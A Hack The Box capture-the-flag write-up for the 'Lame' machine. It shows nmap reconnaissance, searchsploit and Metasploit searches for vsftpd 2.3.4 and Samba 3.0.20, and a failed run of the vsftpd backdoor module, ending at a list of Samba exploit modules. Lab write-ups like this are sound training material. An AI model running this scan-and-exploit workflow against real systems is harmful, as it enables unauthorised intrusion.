# htb-lame
This is my [Hack the box](https://www.hackthebox.eu/)'s Lame machine write-up.

## Machine
OS: GNU/Linux

IP: 10.10.10.3

Level: Easy

## Scan
[Nmap](https://github.com/nmap/nmap) scan of the target:

`nmap -sV -sC -oN lame.nmap 10.10.10.3`

Flags:
 - `-sV`: Version detection
 - `-sC`: Script scan using the default set of scripts
 - `-oN`: Output in normal nmap format

```
root@kali:~/htb/lame# nmap -sV -sC -oN lame.nmap 10.10.10.3
Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-23 08:28 EDT
Nmap scan report for 10.10.10.3
Host is up (0.017s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.36
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -2d22h55m26s, deviation: 0s, median: -2d22h55m26s
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-05-20T05:33:31-04:00
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.49 seconds
```

## FTP service
Let's see what we can get from the FTP service. First, search for exploits using [searchsploit](https://github.com/offensive-security/exploitdb):
```bash
root@kali:~/htb/lame# searchsploit vsftpd 2.3.4
---------------------------------- ----------------------------------------
 Exploit Title                    |  Path
                                  | (/usr/share/exploitdb/)
---------------------------------- ----------------------------------------
vsftpd 2.3.4 - Backdoor Command E | exploits/unix/remote/17491.rb
---------------------------------- ----------------------------------------
Shellcodes: No Result
```

This may be interesting. Use [Metasploit](https://github.com/rapid7/metasploit-framework) to get more information:
```bash
root@kali:~/htb/lame# metasploit

msf > search vsftpd 2.3.4

Matching Modules
================

   Name                                                      Disclosure Date  Rank       Description
   ----                                                      ---------------  ----       -----------
   auxiliary/gather/teamtalk_creds                                            normal     TeamTalk Gather Credentials
   exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  osCommerce Installer Unauthenticated Code Execution
   exploit/multi/http/struts2_namespace_ognl                 2018-08-22       excellent  Apache Struts 2 Namespace Redirect OGNL Injection
   exploit/unix/ftp/vsftpd_234_backdoor                      2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution
```

Try to exploit the backdoor:
```bash
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic
   
msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```
No luck here 😭

## Samba
Search using searchsploit:

```bash
root@kali:~/htb/lame# searchsploit samba 3.0.20
--------------------------------------------- ----------------------------------------
 Exploit Title                               |  Path
                                             | (/usr/share/exploitdb/)
--------------------------------------------- ----------------------------------------
Samba 3.0.20 < 3.0.25rc3 - 'Username' map sc | exploits/unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow        | exploits/linux/remote/7701.txt
--------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

Search on metasploit
```
msf > search samba 3.0.20

Matching Modules
================

   Name                                                   Disclosure Date  Rank       Description
   ----                                                   ---------------  ----       -----------
   auxiliary/admin/http/wp_easycart_privilege_escalation  2015-02-25       normal     WordPress WP EasyCart Plugin Privilege Escalation
   auxiliary/admin/smb/samba_symlink_traversal                             normal     Samba Symlink Directory Traversal
   auxiliary/dos/samba/lsa_addprivs_heap                                   normal     Samba lsa_io_privilege_set Heap Overflow
   auxiliary/dos/samba/lsa_transnames_heap                                 normal     Samba lsa_io_trans_names Heap Overflow
   auxiliary/dos/samba/read_nttrans_ea_list                                normal     Samba read_nttrans_ea_list Integer Overflow
   auxiliary/scanner/rsync/modules_list                                    normal     List Rsync Modules
   auxiliary/scanner/smb/smb_uninit_cred                                   normal     Samba _netr_ServerPasswordSet Uninitialized Credential State
   exploit/freebsd/samba/trans2open                       2003-04-07       great      Samba trans2open Overflow (*BSD x86)
   exploit/linux/samba/chain_reply                        2010-06-16       good       Samba chain_reply Memory Corruption (Linux x86)
   exploit/linux/samba/is_known_pipename                  2017-03-24       excellent  Samba is_known_pipename() Arbitrary Module Load
   exploit/linux/samba/lsa_transnames_heap                2007-05-14       good       Samba lsa_io_trans_names Heap Overflow
   exploit/linux/samba/setinfopolicy_heap                 2012-04-10       normal     Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   exploit/linux/samba/trans2open                         2003-04-07       great      Samba trans2open Overflow (Linux x86)
   exploit/multi/samba/nttrans                            2003-04-07       average    Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
   exploit/multi/samba/usermap_script                     2007-05-14       excellent  Samba "username map script" Command Execution
   exploit/osx/samba/lsa_transnames_heap                  2007-05-14       average    Samba lsa_io_trans_names Heap Overflow
   exploit/osx/samba/trans2open                           2003-04-07       great      Samba trans2open Overflow (Mac OS X PPC)
   exploit/solaris/samba/lsa_transnames_heap              2007-05-14       average    Samba lsa_io_trans_names Heap Overflow
   exploit/solaris/samba/trans2open                       2003-04-07       great      Samba trans2open Overflow (Solaris SPARC)
   exploit/unix/http/quest_kace_systems_management_rce    2018-05-31       excellent  Quest KACE Systems Management Command Injection
   exploit/unix/misc/distcc_exec                          2002-02-01       excellent  DistCC Daemon Command Execution
   exploit/unix/webapp/citrix_access_gateway_exec         2010-12-21       excellent  Citrix Access Gateway Command Execution
   exploit/windows/fileformat/ms14_060_sandworm           2014-10-14       excellent  MS14-060 Microsoft Windows OLE Package Manager Code Execution
   exploit/windows/http/sambar6_search_results            2003-06-21       normal     Sambar 6 Search Results Buffer Overflow
   exploit/windows/license/calicclnt_getconfig            2005-03-02       average    Computer Associates License Client GETCONFIG Overflow
   exploit/windows/smb/group_policy_startup               2015-01-26       manual     Group Policy Script Execution From Shared Resource
   post/linux/gather/enum_configs                                          normal     Linux Gather Configurations
```
